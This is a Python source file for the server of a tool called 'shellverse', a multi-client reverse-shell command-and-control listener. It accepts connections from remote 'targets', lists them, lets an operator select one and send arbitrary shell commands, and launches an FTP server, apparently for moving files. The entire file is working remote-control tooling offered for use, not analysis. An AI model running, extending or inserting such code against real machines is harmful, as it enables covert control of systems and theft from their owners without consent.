import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal
import os
from server.verbose import logo,about
from utils import logger
from server import settings
from server.handlers import ftp_server

COMMANDS = {'help':['Shows this help list'],
            'list':['show  connected targets'],
            'about':['print details about shellverse'],
            'select':['Selects a target by its index. Takes index as a parameter'],
            'quit':['Stops current connection with a target. To be used when target is selected'],
            'shutdown':['Shuts server down'],
           }

def print_help():
    for cmd, v in COMMANDS.items():
        print("{0}:\t{1}".format(cmd, v[0]))

class Server(object):

    def __init__(self):
        self.host = settings.SERVER_ADDR
        self.port = settings.SERVER_PORT
        self.socket = None
        self.all_connections = []
        self.all_addresses = []
 
    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        logger.info('Quitting gracefully')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                logger.exception(e)
                print('Could not close connection %s' % str(e))
        self.socket.close()
        sys.exit(0)

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            logger.exception(msg)
            print("Socket creation error: " + str(msg))
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            logger.exception(e)
            print("Socket binding error: " + str(e))
            time.sleep(settings.RETRY_TIME)
            self.socket_bind()
        return

    def accept_connections(self):
        """ Accept connections from multiple clients and save to list """
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                logger.exception(e)
                print('Error accepting connections: %s' % str(e))
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            logger.info('Connection has been established: {0} ({1})'.format(address[-1], address[0]))
            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
        return

    def start_shelverse(self):
        while True:
            cmd = input('shelverse> ')
            if not cmd or cmd.split()[0] not in COMMANDS.keys():
                print("Command not recognized")
            elif cmd == 'list':
                self.list_connections()
            elif 'select' in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif cmd == 'shutdown':
                    queue.task_done()
                    queue.task_done()
                    break
            elif cmd == 'help':
                print_help()
            elif cmd == '':
                pass
            else:
                print('Command not recognized')
        return

    def list_connections(self):
        """ List all connections """
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except Exception as e:
                logger.exception(e)
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('----- Clients -----' + '\n' + results)
        return

    def get_target(self, cmd):
        """ Select target client
        :param cmd:
        """
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except Exception as e:
            logger.exception(e)
            print('Client index should be an integer')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError as e:
            logger.exception(e)
            print('Not a valid selection')
            return None, None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return target, conn

    def read_command_output(self, conn):
        """ Read message length and unpack it into an integer
        :param conn:
        """
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(conn, msglen)

    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def send_target_commands(self, target, conn):
        """ Connect with remote target client
        :param conn:
        :param target:
        """
        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                if cmd == 'quit':
                    break
            except Exception as e:
                logger.exception(e)
                print("Connection was lost %s" %str(e))
                break
        del self.all_connections[target]
        del self.all_addresses[target]
        return


NUMBER_OF_WORKERS = 3
queue = Queue()

def create_workers():
    """ Create worker threads (will die when main exits) """
    server = Server()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_WORKERS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return

def work(server):
    """ 
    Do the next job in the queue (threads for handling connections, sending commands,start ftp server)
    threads for:
        handling connections, 
        sending commands
        start ftp server
    :param server:
    """
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.start_shelverse()
        if x== 3:
            ftp_server.basic_ftp_server()
        queue.task_done()
    return

def create_jobs():
    """ Each list item is a new job """
    for x in list(range(1,NUMBER_OF_WORKERS+1)):
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()

if __name__ == '__main__':
    main()
